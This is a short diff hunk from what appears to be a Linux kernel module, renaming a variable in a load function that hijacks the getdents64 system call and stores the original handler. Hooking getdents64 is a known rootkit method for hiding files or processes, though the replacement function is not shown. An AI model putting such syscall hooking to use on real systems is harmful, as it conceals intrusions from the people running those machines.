@@ -64,12 +64,12 @@ int load(void) {
         return -1;
     }
 
-    unsigned long getdents_ptr = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
-    if (!getdents_ptr) {
+    unsigned long getdents_address = hijack_syscall(__NR_getdents64, (unsigned long)new_getdents64);
+    if (!getdents_address) {
         return -1;
     }
     
-    original_getdents64_ptr = (original_getdents64_t)getdents_ptr;
+    original_getdents64_ptr = (original_getdents64_t)getdents_address;
     pr_info("Initialized successfuly!");
 
     return 0;
